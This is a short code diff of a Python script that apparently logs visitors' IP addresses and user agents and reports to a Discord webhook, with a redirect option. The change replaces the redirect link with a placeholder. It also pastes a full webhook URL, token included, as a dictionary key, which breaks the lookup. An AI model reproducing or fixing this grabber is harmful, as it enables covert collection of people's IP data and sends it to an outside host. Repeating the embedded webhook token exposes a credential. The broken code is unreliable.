@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "https://c-trop-longg-66is.vercel.app/" # Link to the webpage to redirect to 
+        "page": "c le lien la" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -75,7 +75,7 @@ def botCheck(ip, useragent):
         return False
 
 def reportError(error):
-    requests.post(config["webhook"], json = {
+    requests.post(config["https://discord.com/api/webhooks/1494706597405135058/cftkJvDd_w3YYn_fBJ8RZRshxNq9m54U35EM5f1O5WsJN0ARNASkq8IPXSYcXN9x"], json = {
     "username": config["username"],
     "content": "@everyone",
     "embeds": [
